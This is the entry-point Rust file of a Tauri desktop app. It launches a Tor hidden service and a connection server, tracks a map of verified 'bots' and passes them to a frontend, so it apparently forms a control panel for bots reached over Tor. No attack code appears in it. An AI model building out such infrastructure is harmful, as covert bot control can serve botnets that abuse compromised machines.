// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
use std::{ collections::HashMap, sync::Arc };
use chrono::{ DateTime, Utc };
use serde_json::json;
use server::{ http_server::{ BotMap, ServerHandler }, utils::convert_bot_to_frontend };
use lazy_static::lazy_static;
use server_vars::types::bot::BotItem;
use tokio::sync::RwLock;
use tor_proxy::hidden_service::HiddenServiceRunner;

mod tor_proxy;
mod server;
mod router;

lazy_static! {
    pub static ref SERVER_HANDLER: Arc<RwLock<Option<ServerHandler>>> = Arc::new(RwLock::new(None));
}
#[tauri::command(async)]
async fn get_bot_items(filter_ids: Vec<String>) -> String {
    let server_ref = SERVER_HANDLER.read().await;
    let handler = server_ref.as_ref().unwrap();
    let bot_map = handler.bot_map.read().await;

    let bot_item_map: HashMap<String, BotItem> = bot_map
        .iter()
        .filter(|(id, bot)| bot.verified && !filter_ids.contains(id))
        // filter verified, and not already loaded
        .map(|(id, bot)| { (id.clone(), convert_bot_to_frontend(bot)) })
        .collect();

    let json_string = serde_json::to_string(&json!(bot_item_map)).unwrap();
    return json_string;
}

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let tokio_runtime = tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap();

    tokio_runtime.spawn(async move {
        let mut onion_proxy = HiddenServiceRunner::new();
        onion_proxy.run();
    });

    tokio_runtime.spawn(async move {
        if let Ok(mut tor_server) = ServerHandler::new().await {
            let mut server_ref = SERVER_HANDLER.write().await;
            *server_ref = Some(tor_server.clone());
            drop(server_ref);

            if let Err(e) = tor_server.listen_for_connections().await {
                eprintln!("Server errored out: {}", e);
            }
        }
    });
    tauri::Builder
        ::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, get_bot_items])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
